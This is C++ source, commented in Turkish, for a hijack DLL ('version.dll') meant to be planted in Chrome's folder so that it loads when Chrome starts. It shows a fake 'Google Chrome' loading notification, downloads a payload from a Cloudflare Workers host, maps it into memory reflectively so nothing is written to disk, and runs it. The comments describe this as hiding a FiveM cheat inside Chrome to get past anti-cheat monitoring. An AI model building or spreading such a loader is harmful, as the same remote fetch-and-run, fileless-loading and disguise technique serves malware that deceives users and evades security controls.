// ============================================================
//  loader.cpp — version.dll (Loader) [Moon Private]
//
//  Chrome klasörüne konur. Chrome açılınca otomatik yüklenir.
//  Cloudflare Workers/R2'den gerçek hileyi indirir → belleğe yükler → dosyayı siler.
//  Hile Chrome'un içinde çalışır, dışarıdan Chrome gibi görünür.
//  Chrome → ReadProcessMemory → FiveM bağlantısı.
// ============================================================
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <Windows.h>
#include <winhttp.h>
#include <ShlObj.h>
#include <vector>
#include <string>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Shell32.lib")
#include <XorStr/XorStr.hpp>

// ════════════════════════════════════════════════════════════
//  SUNUCU AYARLARI — bunları kendi VDS'ine göre değiştir
// ════════════════════════════════════════════════════════════
static const WORD SRV_PORT = 443;
// ════════════════════════════════════════════════════════════

static HMODULE g_self = nullptr;
static HWND    g_hwnd = nullptr;

// ─── Loading Penceresi (Spotify bildirimi gibi) ──────────────
static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rc; GetClientRect(hwnd, &rc);

        // Koyu arka plan
        HBRUSH bgBrush = CreateSolidBrush(RGB(22, 22, 22));
        FillRect(hdc, &rc, bgBrush);
        DeleteObject(bgBrush);

        // Sol kenar — Spotify yeşili
        HBRUSH greenBrush = CreateSolidBrush(RGB(30, 215, 96));
        RECT left = { 0, 0, 4, rc.bottom };
        FillRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
        FillRect(hdc, &left, greenBrush);
        DeleteObject(greenBrush);

        // Arka plan tekrar (üstüne)
        bgBrush = CreateSolidBrush(RGB(22, 22, 22));
        RECT content = { 4, 0, rc.right, rc.bottom };
        FillRect(hdc, &content, bgBrush);
        DeleteObject(bgBrush);

        SetBkMode(hdc, TRANSPARENT);

        // Başlık: "Spotify"
        SetTextColor(hdc, RGB(235, 235, 235));
        HFONT fontTitle = CreateFontW(15, 0, 0, 0, FW_SEMIBOLD, 0, 0, 0,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
        HFONT oldFont = (HFONT)SelectObject(hdc, fontTitle);
        RECT rTitle = { 16, 10, rc.right - 8, rc.bottom / 2 };
        DrawTextW(hdc, L"Google Chrome", -1, &rTitle, DT_LEFT | DT_SINGLELINE | DT_VCENTER);
        DeleteObject(fontTitle);

        // Alt yazı: "Bileşenler yükleniyor..."
        SetTextColor(hdc, RGB(155, 155, 155));
        HFONT fontSub = CreateFontW(13, 0, 0, 0, FW_NORMAL, 0, 0, 0,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
        SelectObject(hdc, fontSub);
        RECT rSub = { 16, rc.bottom / 2 + 2, rc.right - 8, rc.bottom - 8 };
        DrawTextW(hdc, L"Bile\u015fenler y\u00fckleniyor...", -1, &rSub, DT_LEFT | DT_SINGLELINE | DT_VCENTER);

        SelectObject(hdc, oldFont);
        DeleteObject(fontSub);
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

static DWORD WINAPI WindowThread(LPVOID) {
    WNDCLASSEXW wc  = {};
    wc.cbSize       = sizeof(wc);
    wc.lpfnWndProc  = WndProc;
    wc.hInstance    = g_self;
    wc.lpszClassName = L"ChromeNotif";
    RegisterClassExW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int w = 310, h = 72;

    g_hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
        L"ChromeNotif", L"",
        WS_POPUP,
        sw - w - 16,    // Sağ alt köşe
        sh - h - 52,
        w, h,
        nullptr, nullptr, g_self, nullptr
    );
    if (!g_hwnd) return 0;

    ShowWindow(g_hwnd, SW_SHOWNOACTIVATE);
    UpdateWindow(g_hwnd);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}

// ─── HTTP İndirici (WinHTTP — sıfır dış bağımlılık) ─────────
static std::vector<BYTE> HttpGet(const wchar_t* host, WORD port, const wchar_t* path) {
    std::vector<BYTE> buf;

    HINTERNET hSess = WinHttpOpen(
        XorString(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"),
        WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
    if (!hSess) return buf;

    HINTERNET hConn = WinHttpConnect(hSess, host, port, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return buf; }

    HINTERNET hReq = WinHttpOpenRequest(hConn, XorString(L"GET"), path,
        nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE); // HTTPS zorunlu (Cloudflare)
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return buf; }

    if (WinHttpSendRequest(hReq, nullptr, 0, nullptr, 0, 0, 0) &&
        WinHttpReceiveResponse(hReq, nullptr)) {
        BYTE tmp[8192]; DWORD rd = 0;
        while (WinHttpReadData(hReq, tmp, sizeof(tmp), &rd) && rd > 0)
            buf.insert(buf.end(), tmp, tmp + rd);
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return buf;
}

// ─── Ana Loader Thread ───────────────────────────────────────
static DWORD WINAPI LoaderThread(LPVOID) {
    // Spotify'ın tamamen başlamasını bekle
    Sleep(2000);

    // Loading bildirimi göster (ayrı thread — message loop gerek)
    HANDLE hWndThread = CreateThread(nullptr, 0, WindowThread, nullptr, 0, nullptr);

    // 3 saniye daha bekle → toplam ~5sn
    Sleep(3000);

    // Cloudflare R2'den indir (Workers proxy)
    auto payload = HttpGet(XorString(L"moon-auth-service.moonsal.workers.dev"), 443, XorString(L"/download/payload"));

    // Loading bildirimini kapat
    if (g_hwnd)      PostMessageW(g_hwnd, WM_DESTROY, 0, 0);
    if (hWndThread) { WaitForSingleObject(hWndThread, 3000); CloseHandle(hWndThread); }

    if (payload.empty()) return 0;

    // ── Reflective PE Mapper ─────────────────────────────────────
    // Disk'e hiç yazmadan bellek tamponundan DLL'i yükle.
    // LoadLibrary çağrısı yok → AC disk/handle izleme bypass.

    BYTE* raw = payload.data();
    SIZE_T rawSize = payload.size();

    if (rawSize < sizeof(IMAGE_DOS_HEADER)) return 0;
    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(raw);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(raw + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;

    // Tercih edilen adrese map et; mümkün değilse herhangi bir yere
    LPVOID base = VirtualAlloc(
        reinterpret_cast<LPVOID>(nt->OptionalHeader.ImageBase),
        imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!base)
        base = VirtualAlloc(nullptr, imageSize,
                            MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!base) return 0;

    // Header kopyala
    memcpy(base, raw, nt->OptionalHeader.SizeOfHeaders);

    // Section'ları kopyala
    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (sec[i].SizeOfRawData == 0) continue;
        memcpy(
            static_cast<BYTE*>(base) + sec[i].VirtualAddress,
            raw + sec[i].PointerToRawData,
            sec[i].SizeOfRawData);
    }

    // Relocation fixup
    LONGLONG delta = static_cast<LONGLONG>(
        reinterpret_cast<uintptr_t>(base) - nt->OptionalHeader.ImageBase);

    if (delta != 0) {
        auto& relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        BYTE* relocBlock = static_cast<BYTE*>(base) + relocDir.VirtualAddress;
        BYTE* relocEnd   = relocBlock + relocDir.Size;

        while (relocBlock < relocEnd) {
            auto* block = reinterpret_cast<IMAGE_BASE_RELOCATION*>(relocBlock);
            if (!block->SizeOfBlock) break;
            DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* entries = reinterpret_cast<WORD*>(block + 1);
            for (DWORD j = 0; j < count; ++j) {
                WORD type   = entries[j] >> 12;
                WORD offset = entries[j] & 0x0FFF;
                if (type == IMAGE_REL_BASED_DIR64) {
                    uintptr_t* ptr = reinterpret_cast<uintptr_t*>(
                        static_cast<BYTE*>(base) + block->VirtualAddress + offset);
                    *ptr += (uintptr_t)delta;
                }
            }
            relocBlock += block->SizeOfBlock;
        }
    }

    // Import Address Table (IAT) doldur
    auto& importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.VirtualAddress) {
        auto* imp = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
            static_cast<BYTE*>(base) + importDir.VirtualAddress);
        for (; imp->Name; ++imp) {
            const char* dllName = reinterpret_cast<const char*>(
                static_cast<BYTE*>(base) + imp->Name);
            HMODULE hDep = LoadLibraryA(dllName);
            if (!hDep) continue;

            auto* thunk    = reinterpret_cast<IMAGE_THUNK_DATA64*>(
                static_cast<BYTE*>(base) + imp->FirstThunk);
            auto* origThunk = reinterpret_cast<IMAGE_THUNK_DATA64*>(
                static_cast<BYTE*>(base) + (imp->OriginalFirstThunk
                    ? imp->OriginalFirstThunk : imp->FirstThunk));

            for (; origThunk->u1.AddressOfData; ++thunk, ++origThunk) {
                FARPROC fn = nullptr;
                if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                    fn = GetProcAddress(hDep,
                        reinterpret_cast<LPCSTR>(origThunk->u1.Ordinal & 0xFFFF));
                } else {
                    auto* ibn = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                        static_cast<BYTE*>(base) + origThunk->u1.AddressOfData);
                    fn = GetProcAddress(hDep, ibn->Name);
                }
                thunk->u1.Function = reinterpret_cast<ULONGLONG>(fn);
            }
        }
    }

    // CPU instruction cache'i temizle — yeni yazılan kodu görsün
    FlushInstructionCache(GetCurrentProcess(), base, imageSize);

    // DllMain çağır
    using DllMainFn = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
    auto dllMain = reinterpret_cast<DllMainFn>(
        static_cast<BYTE*>(base) + nt->OptionalHeader.AddressOfEntryPoint);
    dllMain(static_cast<HINSTANCE>(base), DLL_PROCESS_ATTACH, nullptr);

    return 0;
}

// ─── DllMain ─────────────────────────────────────────────────
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        g_self = hModule;
        DisableThreadLibraryCalls(hModule);
        HANDLE h = CreateThread(nullptr, 0, LoaderThread, nullptr, 0, nullptr);
        if (h) CloseHandle(h);
    }
    return TRUE;
}
